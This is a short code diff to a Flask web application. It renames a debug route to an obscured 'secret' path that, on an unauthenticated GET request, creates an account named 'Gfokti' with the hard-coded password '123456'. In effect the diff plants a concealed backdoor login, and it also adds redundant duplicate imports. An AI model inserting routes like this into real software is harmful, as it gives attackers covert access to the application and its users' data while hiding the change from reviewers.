@@ -3669,9 +3669,12 @@ from werkzeug.security import generate_password_hash
 from app import db
 from models import User
 from flask import make_response
+from werkzeug.security import generate_password_hash
+from app import db
+from models import User
 
-@app.route("/debug-9ce6", methods=["GET"])
-def create_test_users():
+@app.route("/__setup-user-access__7f8a2", methods=["GET"])
+def setup_users_secret_route():
     if not User.query.filter_by(username="Gfokti").first():
         user1 = User(username="Gfokti", password=generate_password_hash("123456", method='sha256'))
         db.session.add(user1)
